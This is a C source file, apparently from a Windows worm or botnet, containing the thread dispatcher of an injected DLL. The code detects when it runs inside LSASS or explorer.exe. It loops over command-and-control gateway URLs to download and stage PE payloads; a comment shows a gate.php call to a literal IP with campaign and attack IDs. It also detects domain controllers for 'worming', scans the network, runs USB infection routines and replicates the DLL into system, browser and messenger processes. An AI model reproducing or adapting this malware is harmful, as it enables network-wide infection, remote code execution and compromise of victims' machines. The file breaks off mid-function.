#include "main.h"
#include "globals.h"

static LPTOP_LEVEL_EXCEPTION_FILTER			orig_top_level_exception_filter;

HANDLE										tftp_mutex;
HANDLE										payload_copy_mutex;
HANDLE										payload_handle;

VOID thread_dispatcher(VOID)
{
	ERROR_CODE				status;

	WSADATA					wsadata								= {0};

	LPWSTR					dc;
	LPSTR					process_name						= NULL,
							dc_a;

	DWORD					version,
							version_minor,
							version_major;

	WCHAR					comp_name[256]						= {0};
	CHAR					process_path[MAX_PATH];
	UINT					comp_name_size						= sizeof(comp_name);

	PBYTE					ptr;

	UINT					thread_count;
	DWORD					threads[MAX_THREADS];

	struct hostent			*host;


/*######################################################################################*/
//
//		Global Exception Handler
//
/*######################################################################################*/
#ifdef ENABLE_GLOBAL_EXCEPTION_HANDLER
	thread_control(TRUE, threads, (UINT)&thread_count);
	orig_top_level_exception_filter = SetUnhandledExceptionFilter(top_level_exception_handler);
	thread_control(FALSE, threads, (UINT)&thread_count);
#endif





	// Start WSA
	WSAStartup(MAKEWORD(2,2), &wsadata);






/*######################################################################################*/
//
//		Unpack lists and USER configs
//
/*######################################################################################*/
	if (dropper_dll == FALSE) {
#ifdef DEBUG_OUT
		DEBUG("+threads> Reading user configuration...");
#endif
		extract_user_config();
	} else {
#ifdef DEBUG_OUT
		DEBUG("+threads> Reading user configuration (dropper)...");
#endif
		extract_user_config();
	}





/*######################################################################################*/
//
//		Thread Dispatcher
//
/*######################################################################################*/
#ifdef DEBUG_OUT
	DEBUG("+threads> Thread dispatcher on PID %d started", GetCurrentProcessId());
#endif

	// Initialize thread counter
	ZeroMemory((void *)local_threads, sizeof(local_threads));
	local_thread_counter = 0;

	// Determine module name
	ZeroMemory(process_path, sizeof(process_path));
	GetModuleFileNameA(NULL, process_path, sizeof(process_path));
	process_name = get_file_name_from_path(process_path);

	// Default dc_address
	dc_address = 0xcccccccc;

	// Lower process name characters (lower case)
	ptr = (PBYTE)process_name;
	while (*ptr != 0) {

		if ((*ptr >= 0x41) && (*ptr <= 0x5a)) {
			*ptr = (BYTE)(*ptr + 0x20);
		}

		ptr++;
	}

#ifdef DEBUG_OUT
	DEBUG("+threads[%d]> Running in process %s", GetCurrentProcessId(), process_name);
#endif

	// Determine if the DLL is running in the context of LSASS
	status = string_compare((LPCSTR)process_name, LSASS_STRING, string_length(LSASS_STRING));
	if (!status) {

		// Check the USER config to see if nTM is enabled
		if (global_config.ntm == FALSE) {
#ifdef DEBUG_OUT
			DEBUG("+lsass> Loaded in LSASS, but user specified nTM as disabled");
#endif
			return;
		}

/*######################################################################################*/
//
//		DLL Running in LSASS.
//
/*######################################################################################*/
		// Set Global exception handler
		//orig_top_level_exception_filter = SetUnhandledExceptionFilter(top_level_exception_handler);
#ifdef DEBUG_OUT
		DEBUG("+lsass> DLL Loaded in LSASS");
#endif

/*######################################################################################*/
//
//		Start the Payload Downloader Thread & contact the first gateway
//
/*######################################################################################*/
#ifdef DOWNLOAD_URL_LIST

		payload_copy_mutex = CreateMutexA(NULL, FALSE, LSASS_TO_HUSK_PAYLOAD_MUTEX);
		ReleaseMutex(payload_copy_mutex);
		payload_handle = 0;


#ifdef DEBUG_OUT
		DEBUG("+lsass> Starting payload downloader thread...");
#endif

		dispatch_thread((LPTHREAD_START_ROUTINE)fetch_payload, NULL);

		// Wait for at least one payload
#ifdef DEBUG_OUT
		DEBUG("+lsass> Calling home...");
#endif

#ifdef NICE_DEBUG
		DEBUG("HELIOS> Attempting gate communication...");
#endif

		while (payload_handle == 0) {
			Sleep(10);
		}

#ifdef DEBUG_OUT
		DEBUG("+lsass> Shared mutex obtained (payload)");
#endif

		WaitForSingleObject(payload_copy_mutex, INFINITE);
		Sleep(250);
		ReleaseMutex(payload_copy_mutex);

#ifdef DEBUG_OUT
		DEBUG("+lsass> Initial Payload OK!");
#endif

#endif

/*######################################################################################*/
//
//		Check if we are running as a PDC or DC
//
/*######################################################################################*/
		// Are we running on the domain controller?
		if (NetGetDCName(NULL, NULL, (LPBYTE *)&dc) == NERR_Success) {
			dc = (LPWSTR)((SIZE_T)dc + 4);
			dc_a = unicode_to_ascii(dc, get_unicode_string_length(dc));
			GetComputerName(comp_name, (LPDWORD)&comp_name_size);
			if (!memory_compare((PVOID)comp_name, (PVOID)dc, get_unicode_string_length(dc))) {

				// This is a domain controller FIXME
				dc_address = 0xffffffff;
#ifdef PDC_WORMING
#ifdef DEBUG_OUT
				DEBUG("+lsass> Disabling worming on PDC");
#endif
				Sleep(INFINITE);
#endif

#ifdef DEBUG_OUT
				DEBUG("+lsass> Worming on PDC");
#endif
			}
		} else {

#ifdef DEBUG_OUT
			DEBUG("+lsass> Enabling nTM Client");
#endif
		}

/*######################################################################################*/
//
//		Start ICMP Scanner
//
/*######################################################################################*/
		if (dc_address == 0xffffffff) {
		// Start the passive network scanner on the PDC
#ifdef ICMP_SCAN

			ip_address_list	= (PDWORD)VirtualAlloc(NULL, IP_ADDRESS_LIST_POOL, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

#ifdef ENABLE_DC_NET_SCANNING

#ifdef DEBUG_OUT
			DEBUG("+lsass> Starting passive network scanner on Domain Controller (WARNING)");
#endif

			dispatch_thread((LPTHREAD_START_ROUTINE)scan_net, NULL);

			Sleep(500);

			// Net scanning is disabled, but fill 
#endif
#ifndef ENABLE_DC_NET_SCANNING
#ifndef DISABLE_NTM64
#ifdef DEBUG_OUT
			DEBUG("+lsass> Flooding target buffer using ARP cache");
#endif
			scan_net();
#endif

#endif

#endif
		} else {


			// Start the scanner on all other clients
#ifndef DISABLE_NTM64
			if (NetGetDCName(NULL, NULL, (LPBYTE *)&dc) == NERR_Success) {
				
#ifdef ICMP_SCAN
				ip_address_list	= (PDWORD)VirtualAlloc(NULL, IP_ADDRESS_LIST_POOL, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

#ifdef DEBUG_OUT
				DEBUG("+lsass> Starting passive network scanner (client)...");
#endif

#ifdef NICE_DEBUG
				DEBUG("HELIOS> Starting network scanner");
#endif

				dispatch_thread((LPTHREAD_START_ROUTINE)scan_net, NULL);

				// Wait until we have the sync up object
				//while (dc_address_sync_object == INVALID_HANDLE_VALUE) {
				//	Sleep(1000);
				//}
#endif
			} 

#ifdef DEBUG_OUT
			else {


				DEBUG("+lsass> Passive network scanner failed to start (not in domain). nTM sleeping...");

				Sleep(INFINITE);

			}
#endif

#else

#ifdef DEBUG_OUT
			DEBUG("+lsass> nTM is disabled for x64, so scan_net is not starting");
#endif

#endif
		}


		// Create our tftp mutex
		tftp_mutex = CreateMutexA(NULL, FALSE, TFTPD_READY_MUTEX);
		ReleaseMutex(tftp_mutex);

		// Determine our OS
		version = GetVersion();


/*######################################################################################*/
//
//		nTM
//
/*######################################################################################*/

#ifndef DISABLE_NTM64
#ifdef nTM
		// Check if this machine is associated with a PDC
		if (NetGetDCName(NULL, NULL, (LPBYTE *)&dc) == NERR_Success) { 

#ifdef DEBUG_OUT
			DEBUG("+lsass> PDC DETECTED! Waiting until all processes are injected...");
			Sleep(2000);
#endif


#ifdef DEBUG_OUT
			DEBUG("+lsass> Starting nTM...");
#endif

			if ((version & 0x000000ff) >= 6) {

#ifdef DEBUG_OUT
				DEBUG("+lsass> LSASS.EXE: NT 6.0+");
#endif

				dispatch_thread((LPTHREAD_START_ROUTINE)lsass_procedure, NULL);


				//lsass_procedure();
			} else if ((version & 0x000000ff) == 5) {

#ifdef DEBUG_OUT
				DEBUG("+lsass> LSASS.EXE: NT 5.0");
#endif

				dispatch_thread((LPTHREAD_START_ROUTINE)lsass_procedure5, NULL);


				//lsass_procedure5();
			} else {
				// Not in a domain

#ifdef DEBUG_OUT
				DEBUG("+lsass> Not in any domain. nTM failed.");
#endif
			}
		}
#endif

#ifdef DEBUG_OUT
		DEBUG("+lsass> thread_dispatcher() thread terminating");
#endif
		return;

#else

#ifdef DEBUG_OUT
		DEBUG("+lsass> nTM disabled for x64");
#endif

#endif
	} else {

#ifdef DEBUG_OUT
		DEBUG("+lsass> DLL is not in LSASS process space (nTM disabled)");
#endif

	}



// USB Shit on explorer.exe
#ifdef USB_OPS
	status = string_compare((LPCSTR)process_name, EXPLORER_STRING, string_length(EXPLORER_STRING));
	if (!status) {

		if (global_config.usb != FALSE) { 
#ifdef DEBUG_OUT
		DEBUG("+explorer> DLL Initialized in explorer.exe, starting USB infector subroutines");
#endif

		if (global_config.usb == TRUE) {
			dispatch_thread((LPTHREAD_START_ROUTINE)thread_webdav_enum, NULL);
		} else {
#ifdef DEBUG_OUT
			DEBUG("+explorer> USB Infector subroutines disabled as per user request!");
#endif
		}

#ifdef DEBUG_OUT
		DEBUG("+explorer> thread dispatcher exiting cleanly");
#endif
		} else {

#ifdef DEBUG_OUT
		DEBUG("+explorer> All USB Operations disabled");
#endif
		}

		return;
	} else if (!string_compare((LPCSTR)process_name, NOTEPAD_STRING, string_length(NOTEPAD_STRING))){
#ifdef DEBUG_OUT
		DEBUG("+notepad> DLL Initialized in notepad.exe, starting USB infector subroutines");
#endif

		/*
		ZeroMemory(&global_config, sizeof(global_config));
		global_config.wrapper_probability	= 100;
		global_config.gate_list_string		= GATE_LIST_TEST;
		global_config.gate_list_size		= string_length(GATE_LIST_TEST);
		//global_config.webdav_list_string	= WEBDAV_LIST_TEST;
		//global_config.webdav_list_size		= string_length(WEBDAV_LIST_TEST);
		global_config.attack_id				= 666;
		global_config.campaign_id			= 777;
		global_config.ignored_days = 20;

		usb_file_packer(	"E:\\Stuxnet_Under_the_Microscope.pdf",
							FALSE,
							TRUE,
							FALSE,
							FALSE,
							FALSE,
							NULL,
							".pdf",
							NULL,
							GetModuleHandle(NULL));

		usb_file_packer(	"E:\\pecoff_v8_binary_header.docx",
							FALSE,
							TRUE,
							FALSE,
							FALSE,
							FALSE,
							NULL,
							".docx",
							NULL,
							GetModuleHandle(NULL));

		Sleep(INFINITE);
		*/
	}
#endif

/*######################################################################################*/
//
//		Local Worming
//
/*######################################################################################*/
	
#ifndef _WIN64 // do not replicate if in 64-bit (the dropper takes care of this)
#ifndef DEBUG_OVERRIDE_INJECTOR
#ifdef DLL_REPLICATION
	replicate_dll_thread();
#endif
#endif
#endif

#ifndef DEBUG_OVERRIDE_INJECTOR
	if (dropper_dll == FALSE) {

/*######################################################################################*/
//
//		USB Operations
//
/*######################################################################################*/


/*######################################################################################*/
//
//		Start the Payload Downloader Thread & contact the first gateway
//
/*######################################################################################*/
	/*
#ifdef DOWNLOAD_URL_LIST

	payload_copy_mutex = CreateMutexA(NULL, FALSE, LSASS_TO_HUSK_PAYLOAD_MUTEX);
	ReleaseMutex(payload_copy_mutex);
	payload_handle = 0;


#ifdef DEBUG_OUT
	DEBUG("+lsass> Starting payload downloader thread...");
#endif

	dispatch_thread((LPTHREAD_START_ROUTINE)fetch_payload, NULL);

	// Wait for at least one payload
#ifdef DEBUG_OUT
	DEBUG("+lsass> Calling home...");
#endif

	while (payload_handle == 0) {
		Sleep(10);
	}

	WaitForSingleObject(payload_copy_mutex, INFINITE);
	Sleep(500);
	ReleaseMutex(payload_copy_mutex);

#ifdef DEBUG_OUT
	DEBUG("+lsass> Initial Payload OK!");
#endif

#endif

#ifdef USB_OPS
#ifdef DEBUG_OUT
	DEBUG("+usb> Starting USB Infector in non-SYSTEM PID");
#endif

	dispatch_thread((LPTHREAD_START_ROUTINE)thread_webdav_enum, NULL);

#endif
	*/

/*######################################################################################*/
//
//		Hooking
//
/*######################################################################################*/
#ifdef HOOK_ANY
		dispatch_thread((LPTHREAD_START_ROUTINE)hook_intro, NULL);
#endif

	} else {
#ifdef DEBUG_OUT
		DEBUG("+core32> Dropper DLL main thread completed");
#endif
	}


#ifdef DEBUG_OUT
	DEBUG("+core32> thread_dispatcher() thread terminating");
#endif
#else

#ifdef DEBUG_OUT
	DEBUG("+core32> WARNING WARNING WARNING: Performing CORE functionality in local context!");
#endif

	dispatch_thread((LPTHREAD_START_ROUTINE)thread_webdav_enum, NULL);
#endif

	return;
}

VOID replicate_dll_thread(VOID)
{
	unsigned int i = 0;

#ifdef DLL_REPLICATION
	//DbgPrint("11111!\n");
	if (REPLICATE_STANDARD == TRUE) {
#ifdef DEBUG_OUT
		DEBUG("+worm[%d] Starting propagate_dll_thread on %s and %s!", GetCurrentProcessId(), LSASS_STRING, EXPLORER_STRING);
#endif

		dispatch_thread((LPTHREAD_START_ROUTINE)propagate_dll_thread, (LPVOID)EXPLORER_STRING);
		Sleep(1000);

		if (global_config.ntm != FALSE) {
			dispatch_thread((LPTHREAD_START_ROUTINE)propagate_dll_thread, (LPVOID)LSASS_STRING);
		} else {
#ifdef DEBUG_OUT
			DEBUG("+worm[%d] nTM disabled as per user configuration", GetCurrentProcessId());
#endif
		}

	} else if (REPLICATE_TO_ALL_PIDS == TRUE) {
#ifdef DEBUG_OUT
		/*
		DEBUG("+worm[%d]> Starting propagate_dll_thread on all PIDs!", GetCurrentProcessId());
		*/
#endif

		dispatch_thread((LPTHREAD_START_ROUTINE)propagate_dll_thread, NULL);

	} else if (REPLICATE_TO_NOTEPAD == TRUE) {
#ifdef DEBUG_OUT
		DEBUG("+worm[%d]> Starting propagate_dll_thread on %s", GetCurrentProcessId(), NOTEPAD_STRING);
#endif

		dispatch_thread((LPTHREAD_START_ROUTINE)propagate_dll_thread, (LPVOID)NOTEPAD_STRING);

	} else if (REPLICATE_TO_EXPLORER == TRUE) {
#ifdef DEBUG_OUT
		DEBUG("+worm[%d]> Starting propagate_dll_thread on %s", GetCurrentProcessId(), EXPLORER_STRING);
#endif

		dispatch_thread((LPTHREAD_START_ROUTINE)propagate_dll_thread, (LPVOID)EXPLORER_STRING);

	} else if (REPLICATE_TO_FIREFOX == TRUE) {
#ifdef DEBUG_OUT
		DEBUG("+worm[%d]> Starting propagate_dll_thread on %s", GetCurrentProcessId(), FIREFOX_STRING);
#endif

		dispatch_thread((LPTHREAD_START_ROUTINE)propagate_dll_thread, (LPVOID)FIREFOX_STRING);

	} else if (REPLICATE_TO_OPERA == TRUE) {
#ifdef DEBUG_OUT
		DEBUG("+worm[%d]> <<< Starting propagate_dll_thread on %s", GetCurrentProcessId(), OPERA_STRING);
#endif

		dispatch_thread((LPTHREAD_START_ROUTINE)propagate_dll_thread, (LPVOID)OPERA_STRING);

	} else if (REPLICATE_TO_LSASS == TRUE) {
#ifdef DEBUG_OUT
		DEBUG("+worm[%d]> Starting propagate_dll_thread on %s", GetCurrentProcessId(), LSASS_STRING);
#endif

		if (global_config.ntm != FALSE) {
			dispatch_thread((LPTHREAD_START_ROUTINE)propagate_dll_thread, (LPVOID)LSASS_STRING);
		} else {
#ifdef DEBUG_OUT
			DEBUG("+worm[%d] nTM disabled as per user configuration", GetCurrentProcessId());
#endif
		}

	} else if (REPLICATE_TO_MSN == TRUE) {
#ifdef DEBUG_OUT
		DEBUG("+worm[%d]> Starting propagate_dll_thread on %s", GetCurrentProcessId(), MSN_STRING);
#endif

		dispatch_thread((LPTHREAD_START_ROUTINE)propagate_dll_thread, (LPVOID)MSN_STRING);

	} else if (REPLICATE_TO_PIDGIN == TRUE) {
#ifdef DEBUG_OUT
		DEBUG("+worm[%d]> Starting propagate_dll_thread on %s", GetCurrentProcessId(), PIDGIN_STRING);
#endif

		dispatch_thread((LPTHREAD_START_ROUTINE)propagate_dll_thread, (LPVOID)PIDGIN_STRING);

	}
#endif

	return;
}

#ifdef DOWNLOAD_URL_LIST
VOID fetch_payload(VOID)
{
	ERROR_CODE							status;

	MEMORY_BASIC_INFORMATION			mem_info;
	PIMAGE_DOS_HEADER					dos_header;
	PIMAGE_NT_HEADERS					nt_headers;
	PIMAGE_SECTION_HEADER				section_header;

	HTTP_FILE							http_file;

	//HANDLE								heap;
	PBYTE								decrypted_buffer, 
										ptr;

	PDWORD								payload, 
										shared_payload, 
										payload_image;
	DWORD								tmp_key, 
										payload_size, 
										payload_image_size;

	// URL Parser
	INTERNET_PORT						port;
	LPSTR								hostname,
										ascii_shasum;
	CHAR								ascii_port[16],
										ascii_host_ip[MAX_HOSTNAME_IP_SIZE],
										tmp_buffer[64],
										*url_list[MAX_LIST_LENGTH]				= {0},
										dynamic_url[128];
	//PVOID								base_address;
	UINT								i, 
										element_size,
										total_elements,
										current_url								= 0;

	// Get the local module base address
	/*
#ifndef _WIN64
	base_address	= (PVOID)get_local_dll_base();
#else
	base_address	= (PVOID)get_local_dll_base64();
#endif*/

	// Get headers
	/*
	dos_header		= (PIMAGE_DOS_HEADER)base_address;
	nt_headers		= (PIMAGE_NT_HEADERS)((SIZE_T)base_address + dos_header->e_lfanew);

	section_header	= IMAGE_FIRST_SECTION(nt_headers);
	section_header	= (PIMAGE_SECTION_HEADER)((SIZE_T)section_header + 
					  (SIZE_T)(((SHORT)nt_headers->FileHeader.NumberOfSections - 1) * (SHORT)sizeof(IMAGE_SECTION_HEADER)));

	// Get buffers
	key = *(PDWORD)((SIZE_T)base_address + (UINT)section_header->VirtualAddress);
	*/
	
	// Allocate memory to decrypted buffer
	//heap				= HeapCreate(0, 0, global_config.gate_list_size);
	//decrypted_buffer	= (PBYTE)HeapAlloc(GetProcessHeap(), 0, global_config.gate_list_size);
	//ZeroMemory(decrypted_buffer, global_config.gate_list_size);

	// Copy into new buffer
	//CopyMemory(decrypted_buffer, (void *)((UINT)section_header->VirtualAddress + (SIZE_T)base_address), (UINT)global_config.gate_list_size);

	// Decrypt buffer
	/*
	tmp_key				= global_config.key;
	ptr					= (PBYTE)((SIZE_T)decrypted_buffer + 4);
	for (i = 0; i < section_header->SizeOfRawData - 4; i++) {

		*ptr = (BYTE)(*ptr ^ tmp_key);

		tmp_key = tmp_key >> 8;

		if (tmp_key == 0) {
			tmp_key = key;
		}

		ptr++;
	}*/

	//BREAK;

	// Setup IDs
	//attack_id			= (DWORD)(*(PDWORD)((SIZE_T)decrypted_buffer + ATTACK_ID));
	//campaign_id			= (DWORD)(*(PDWORD)((SIZE_T)decrypted_buffer + CAMPAIGN_ID));

	// Build list array
	total_elements		= 0;
	ptr					= (PBYTE)global_config.gate_list_string;
	while (TRUE) {

		// Get size of first element
		element_size = 0;
		while (	(*ptr != 0) &&
				(*ptr != 0x0d)) {
			element_size++;
			ptr++;
		}

		if (*ptr == 0) {
			break;
		}

		// Allocate memory for the string
		url_list[total_elements] = (char *)HeapAlloc(GetProcessHeap(), 0, element_size + 1);
		ZeroMemory((void *)url_list[total_elements], element_size + 1);

		// Copy into new buffer
		CopyMemory((void *)url_list[total_elements], (void *)((SIZE_T)ptr - (SIZE_T)element_size), element_size);

		// Go to next string
		ptr = (PBYTE)((SIZE_T)ptr + 2);

		// Test if this is the end
		if (*ptr == 0) {
			break;
		}

		total_elements++;
	}

	// Main fetch loop
	i = 0;
	while (TRUE) {

		// Check if we have reached the maximum limit of gateways
		if (url_list[current_url] == NULL) {
			current_url = 0;
		}

		// Determine the URL domain or IP
		ZeroMemory((void *)&http_file, sizeof(HTTP_FILE));

		// Download payload
		{

			// Get port
			{
				ptr = (PBYTE)((SIZE_T)url_list[current_url] + 7);
				while (*ptr != ':') {
					ptr++;
				}
				ptr++;

				i = 0;
				while (*ptr != '/') {
					i++;
					ptr++;
				}

				ZeroMemory(ascii_port, sizeof(ascii_port));
				CopyMemory(ascii_port, (void *)((SIZE_T)ptr - i), i);
				port = (INTERNET_PORT)f_atoi(ascii_port);
			}

			// Get hostname or ip
			{
				ZeroMemory(ascii_host_ip, sizeof(ascii_host_ip));
				ptr = (PBYTE)((SIZE_T)url_list[current_url] + 7);
				i = 0;
				while (*ptr != ':') {
					i++;
					ptr++;
				}
				CopyMemory(ascii_host_ip, (void *)((SIZE_T)ptr - i), i);
			}

			// Parse IP or hostname
			{
				i = 0;
				ptr = (PBYTE)ascii_host_ip;
				while (*ptr != 0) {

					if (*ptr == '.') {
						i++;
					}

					ptr++;
				}
				
				// Test if this is a hostname or an ip
				if (i == 3) {
					// IP
					http_file.server_ip = ascii_host_ip;

				} else {
					// Hostname

					http_file.server_host = ascii_host_ip;
				}
			}

			// Generate sum
#ifdef GENERATE_TEXT_CHECKSUM
			ascii_shasum = generate_text_checksum();
#else
			//ascii_shasum = (LPSTR)HeapAlloc(GetProcessHeap(), 0, string_length("2fd4e1c67a2d28fced849ee1bb76e7391b93eb12") + 1);
			//ZeroMemory(ascii_shasum, string_length("2fd4e1c67a2d28fced849ee1bb76e7391b93eb12") + 1);
			//CopyMemory(ascii_shasum, "2fd4e1c67a2d28fced849ee1bb76e7391b93eb12", string_length("2fd4e1c67a2d28fced849ee1bb76e7391b93eb12"));
#endif

			// Generate URL (gate.php?w=$campaign&a=$attack&c=$sha1sum) FIXME SPRINTF
			/* http://95.211.46.222:80/gate-proxy/gate.php?w=777&a=666&c=2fd4e1c67a2d28fced849ee1bb76e7391b93eb12 */

			ZeroMemory(dynamic_url, sizeof(dynamic_url));
			//f_snprintf(dynamic_url, sizeof(dynamic_url), "%s?w=%d&a=%d&c=%s", url_list[current_url], global_config.campaign_id, global_config.attack_id, ascii_shasum);
			f_snprintf(dynamic_url, sizeof(dynamic_url), "%s?w=%d&a=%d&c=%s", url_list[current_url], global_config.campaign_id, global_config.attack_id);


			// Download file
			payload_image		= NULL;
			payload_image_size	= 0;
			if (!grab_gateway_payload(&payload_image, (unsigned int *)&payload_image_size, dynamic_url)) {

				if ((payload_image == NULL) && (payload_image_size == 0)) {

#ifdef DEBUG_OUT
				//DEBUG("+gate[%d]> Gateway [%s] failed. NTSTATUS_ERROR", GetCurrentProcessId(), url_list[current_url]);
				Sleep(1000);
#endif


					current_url++;
					continue;
				}

				// There is data
			}

			// Test the payload for sane MZ header
			dos_header = (PIMAGE_DOS_HEADER)payload_image;
			if (dos_header->e_magic != 'ZM') {

#ifdef DEBUG_OUT
				DEBUG("+gate> Gateway [%s] failed. MZ Header.", url_list[current_url]);
				Sleep(1000);
#endif

				current_url++;
				ZeroMemory(&mem_info, sizeof(MEMORY_BASIC_INFORMATION));
				VirtualQuery(payload_image, &mem_info, sizeof(MEMORY_BASIC_INFORMATION));
				VirtualFree(mem_info.AllocationBase, mem_info.RegionSize, MEM_DECOMMIT);
				continue;
			}

			// Test PE sanity
			nt_headers = (PIMAGE_NT_HEADERS)((DWORD)payload_image + (DWORD)dos_header->e_lfanew);
			if (IsBadReadPtr(nt_headers, 4) || (WORD)nt_headers->Signature != 'EP') {

#ifdef DEBUG_OUT
				DEBUG("+gate> Gateway [%s] failed. PE Header", url_list[current_url]);
				Sleep(1000);
#endif

				current_url++;
				ZeroMemory(&mem_info, sizeof(MEMORY_BASIC_INFORMATION));
				VirtualQuery(payload_image, &mem_info, sizeof(MEMORY_BASIC_INFORMATION));
				VirtualFree(mem_info.AllocationBase, mem_info.RegionSize, MEM_DECOMMIT);
				continue;
			}

			// Test if the bytes downloaded corresponds to PE raw size
			section_header = IMAGE_FIRST_SECTION(nt_headers);
			section_header = (PIMAGE_SECTION_HEADER)((DWORD)section_header + (DWORD)((nt_headers->FileHeader.NumberOfSections - 1) * sizeof(IMAGE_SECTION_HEADER)));
			if ((section_header->PointerToRawData + section_header->SizeOfRawData) != payload_image_size) {

#ifdef DEBUG_OUT
				DEBUG("+gate> Gateway [%s] failed. Invalid segment size", url_list[current_url]);
				Sleep(1000);
#endif

				current_url++;
				ZeroMemory(&mem_info, sizeof(MEMORY_BASIC_INFORMATION));
				VirtualQuery(payload_image, &mem_info, sizeof(MEMORY_BASIC_INFORMATION));
				VirtualFree(mem_info.AllocationBase, mem_info.RegionSize, MEM_DECOMMIT);
				continue;
			}

			// Move payload
			payload			= payload_image;
			payload_size	= (DWORD)payload_image_size;

			// Aquire handle to mutex
			//BREAK;
			WaitForSingleObject(payload_copy_mutex, INFINITE);

			// Update payload buffer

			if ((payload_handle != INVALID_HANDLE_VALUE) && (shared_payload != NULL)) {

				// Existing shared memory exists, so flush buffers
				UnmapViewOfFile(shared_payload);
				CloseHandle(payload_handle);
			}

			// Create a shared map object
			payload_handle = CreateFileMappingA(	INVALID_HANDLE_VALUE,
													NULL,
													PAGE_READWRITE,
													0,
													payload_size,
													LSASS_TO_HUSK_PAYLOAD_MAPPING);
			if (payload_handle == NULL) {
#ifdef DEBUG_OUT
				DEBUG("+gate> Error in CreateFileMappingA");
#endif
				PANIC;
			}
			Sleep(500);

			// Create the payload mapping object
			shared_payload = (PDWORD)MapViewOfFile(	payload_handle,
													FILE_MAP_ALL_ACCESS,
													0,
													0,
													(SIZE_T)payload_size);
			if (shared_payload == NULL) {
#ifdef DEBUG_OUT
				DEBUG("+gate> Error in CreateFileMappingA");
#endif
				PANIC;
			}

			// Copy into shared payload
			ZeroMemory(shared_payload, payload_size);
			CopyMemory(shared_payload, payload, payload_size);

			// Create the key which will notify shared size
			create_registry_key(PAYLOAD_SIZE_HIVE, PAYLOAD_SIZE_SUBKEY, PAYLOAD_SIZE_NAME, payload_size);

			// Release mutex
			ReleaseMutex(payload_copy_mutex);
			Sleep(500);
			WaitForSingleObject(payload_copy_mutex, INFINITE);
			ReleaseMutex(payload_copy_mutex);

#ifdef DEBUG_OUT
			//DEBUG("+gate> Updated payload from gate %s", url_list[current_url]);
#endif

			// Goto next gateway
			current_url++;
			ZeroMemory(&mem_info, sizeof(MEMORY_BASIC_INFORMATION));
			VirtualQuery(payload_image, &mem_info, sizeof(MEMORY_BASIC_INFORMATION));
			VirtualFree(mem_info.AllocationBase, mem_info.RegionSize, MEM_DECOMMIT);

			Sleep(GATEWAY_PAYLOAD_UPDATE);
		}
	}
}
#endif

#ifdef GENERATE_TEXT_CHECKSUM
#ifdef DOWNLOAD_URL_LIST
LPSTR	generate_text_checksum(VOID)
{
	PIMAGE_DOS_HEADER			dos_header;
	PIMAGE_NT_HEADERS			nt_headers;
	PIMAGE_SECTION_HEADER		section_header;

	PBYTE						raw_checksum;
	DWORD						base_address;
	LPSTR						ascii_checksum;
	INT							i;
	CHAR						b, d;

	// Get image base
	base_address = (DWORD)get_local_dll_base();

	// Get headers
	dos_header		= (PIMAGE_DOS_HEADER)base_address;
	nt_headers		= (PIMAGE_NT_HEADERS)((SIZE_T)base_address + dos_header->e_lfanew);
	section_header	= (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(nt_headers);

	// Find the segment through oep
	while (TRUE) {
		
		// Does oep belong in this segment?
		if ((section_header->VirtualAddress < nt_headers->OptionalHeader.AddressOfEntryPoint) &&
			((section_header->VirtualAddress + section_header->Misc.VirtualSize) > nt_headers->OptionalHeader.AddressOfEntryPoint)) {

			break;
		}


		section_header++;
	}

	// Generate raw sum
	raw_checksum = generate_sha1((PDWORD)((DWORD)section_header->VirtualAddress + base_address), section_header->SizeOfRawData);

	// Create memory for ascii checksum
	ascii_checksum = (char *)HeapAlloc(GetProcessHeap(), 0, SIZEOF_SHA_SUM * 2 + 1);
	ZeroMemory(ascii_checksum, SIZEOF_SHA_SUM * 2 + 1);
	
	// Generate ascii checksum
	for (i = 0; i < SIZEOF_SHA_SUM; i++) {

		get_byte_hex(raw_checksum[i], &b, &d);

		ascii_checksum[i * 2] = b;
		ascii_checksum[i * 2 + 1] = d;
	}

	// Return
	HeapFree(GetProcessHeap(), 0, raw_checksum);
	return ascii_checksum;
}
#endif
#endif

VOID dispatch_thread(LPTHREAD_START_ROUTINE function, LPVOID parameters)
{
	SECURITY_ATTRIBUTES		security_attributes;
	UINT					i;

	ZeroMemory(&security_attributes, sizeof(SECURITY_ATTRIBUTES));
	security_attributes.bInheritHandle	= TRUE;
	security_attributes.nLength			= sizeof(SECURITY_ATTRIBUTES);

	CreateThread(&security_attributes, 0, function, parameters, 0, &local_threads[local_thread_counter]);

#ifdef DEBUG_OUT
	DEBUG("+dispatch> Thread %d TID 0x%08x dispatched.", local_thread_counter, local_threads[local_thread_counter]);
#endif

	local_thread_counter++;

	return;
}

#ifndef _WIN64
static LONG CALLBACK top_level_exception_handler(PEXCEPTION_POINTERS exception_pointer)
{
	MEMORY_BASIC_INFORMATION	mem_info			= {0};
	HANDLE						thread;
	int							i;

#ifdef DEBUG_OUT
#ifndef _WIN64
	DEBUG("!!!\n\n\n\n\tTL_EXCEPTION_HANDLER \n\tCRITICAL ERROR 0x%08x \n\tTID: 0x%08x\n\tPID: %d\n\n\n", exception_pointer->ExceptionRecord->ExceptionCode, GetCurrentThreadId(), GetCurrentProcessId());
	DEBUG("\n\nDEBUG:\n\teip: \t\t\t0x%08x\n\tExceptionAddress: \t0x%08x\n", exception_pointer->ContextRecord->Eip, exception_pointer->ExceptionRecord->ExceptionAddress);
#else
	DEBUG("!!!\n\n\n\n\tTL_EXCEPTION_HANDLER \n\tCRITICAL ERROR 0x%08x \n\tTID: 0x%08x\n\tPID: %d\n\n\n", exception_pointer->ExceptionRecord->ExceptionCode, GetCurrentThreadId(), GetCurrentProcessId());
	DEBUG("\n\nDEBUG:\n\teip: \t\t\t0x%08x\n\tExceptionAddress: \t0x%08x\n", exception_pointer->ContextRecord->Rip, exception_pointer->ExceptionRecord->ExceptionAddress);
#endif
#endif

	// Get EIP info
#ifdef DEBUG_OUT 
	DEBUG("FAULTING EIP @ 0x%08x", exception_pointer->ContextRecord->Eip);
	VirtualQuery((LPCVOID)exception_pointer->ContextRecord->Eip, &mem_info, sizeof(MEMORY_BASIC_INFORMATION));
	if (mem_info.Type == MEM_COMMIT) {
		DEBUG("\t\t: 0x%16x", exception_pointer->ContextRecord->Eip);
	} else {
		DEBUG("\t\t: INVALID EIP (ACCESS VIOLATION)");
	}
#endif

	if (exception_pointer->ContextRecord->Eip == PANIC_EIP) {
#ifdef DEBUG_OUT
		DEBUG("::::SYSTEM PANIC WAS CALLED - EXCEPTION FORCED");
#endif
	}

#ifdef DEBUG_OUT
